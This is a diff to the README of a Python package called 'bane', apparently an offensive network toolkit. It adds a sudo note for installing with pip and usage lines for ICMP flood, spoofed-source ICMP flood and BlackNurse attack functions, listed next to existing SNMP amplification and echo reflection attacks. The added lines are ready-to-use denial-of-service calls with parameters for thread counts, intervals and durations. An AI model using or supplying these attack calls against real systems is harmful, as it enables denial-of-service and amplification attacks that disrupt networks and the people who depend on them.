@@ -90,7 +90,7 @@ now let's start some tutorials, shall we?
 I-INSTALLING THE LIBRARY AND IMPORTING:
 ---------------------------------------------------------------------------------------------------------------------------
 
-you can use pip to do that:
+you can use pip to do that ( if you are on linux you must run it with "sudo" ) :
 
 
 pip install bane
@@ -165,3 +165,9 @@ II-Usage:
 <br>bane.snmp_amplification(IP , p=port , duration= 300 , servers=[] , interval=0.1 , threads=50 )
 <h4>ECHO reflection attack:</h4>
 <br>bane.echo_reflection(IP , p=port , min_size=10 , max_size=20 , duration= 300 , servers=[] , interval=0.1 , threads=50 )
+<h4>ICMP FLOOD:</h4>
+<br>bane.icmp_flood(IP, p= port , min_size=10, max_size=20 , duration= 300 , interval=0.001 , threads=500 )
+<h4>ICMP FLOOD with spoofed sources:</h4>
+<br>bane.spoofed_icmp_flood(IP, p= port , min_size=10, max_size=20 , duration= 300 , interval=0.001 , threads=500 )
+<h4>BlackNurse attack:</h4>
+<br>bane.blacknurse(IP, p= port , duration= 300 , interval=0.001 , threads=500 )
